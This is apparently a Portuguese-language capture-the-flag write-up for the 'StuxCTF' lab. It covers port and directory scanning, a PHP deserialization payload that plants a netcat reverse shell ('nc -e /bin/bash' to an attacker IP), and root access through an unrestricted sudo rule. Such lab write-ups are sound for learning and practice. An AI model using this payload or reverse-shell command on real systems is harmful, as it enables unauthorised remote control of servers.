# StuxCTF

* ### Scan de portas - Verificando quais portas estão abertas.
```bash
rustscan -a 10.10.193.138
```
![image](https://github.com/lufffe/Writeups/assets/90646635/4f31ac60-f1b5-4161-8241-46a50b973836)

## Listando Serviços que estão rodando nas portas abertas.
```bash
nmap -A -p 22,80 10.10.193.138
```
![image](https://github.com/lufffe/Writeups/assets/90646635/97f6ea9d-11ee-4c33-a8dd-a3d7915cd53f)

* ### Scan de Arquivos e Diretorios.
```bash
gobuster dir -w wl/directory-list-2.3-big.txt -u http://10.10.193.138 -t 100 --no-error -x html,php,txt,sh,bkp,doc,xlsx
```
![image](https://github.com/lufffe/Writeups/assets/90646635/0f8f6e40-e746-457a-acb4-90279f838a5e)

## Valores da Hint no desafio.
![image](https://github.com/lufffe/Writeups/assets/90646635/923d6434-d6e2-4ec0-a056-39c0417667f6)

## Código em Python para encontrar o diretorio
![image](https://github.com/lufffe/Writeups/assets/90646635/3c0ffe08-4cc7-433f-8b0c-e4c44fc89cfa)

## Diretório Encontrado
> 47315028937264895539131328176684350732577039984023005189203993885687328953804202704977050807800832928198526567069446044422855055

![image](https://github.com/lufffe/Writeups/assets/90646635/f5244643-c683-4dd7-838b-0576aca1fd92)

No parâmetro file tem uma falha de LFI, o output é apenas se existe o aquivo ou não.

```bash
<?php
class file {
public $file = 'script.php';
public $data = '<?php shell_exec("nc -e /bin/bash 10.6.79.217 4455"); ?>';
}
echo (serialize(new file));
?>
```

```bash
php script.php > script.txt
```

O arquivo serializado

![image](https://github.com/lufffe/Writeups/assets/90646635/096999f3-be73-4a1e-a009-3b3583e21b48)

Aqui eu inicio um servidor em python para fazer upload do arquivo serializado

![image](https://github.com/lufffe/Writeups/assets/90646635/e0d9950a-12e0-4752-8a5f-ba7dae0b1d93)

Fazendo o Upload do arquivo criado

![image](https://github.com/lufffe/Writeups/assets/90646635/80104b93-1c19-4f57-abc3-398c18d39fcd)

Como o script era criar um arquivo (script.php) e ele criado eu posso chamar a shell que tem lá.

![image](https://github.com/lufffe/Writeups/assets/90646635/6958ed65-76cf-4daf-b7b8-4b43ca3311fd)

www-data@ubuntu:/home/grecia$ cat user.txt
******************************************

Aqui eu verifico se tem alguma forma de executar o sudo e escalar previlégio, e pra minha surpresa está liberado ALL
```bash
sudo -l
```
![image](https://github.com/lufffe/Writeups/assets/90646635/01e83f2e-300c-45c4-b9b6-f451939905e1)

Executo o sudo su e pego o root.
```bash
sudo su
```

```bash
cat /root/root.txt
```
****************************************
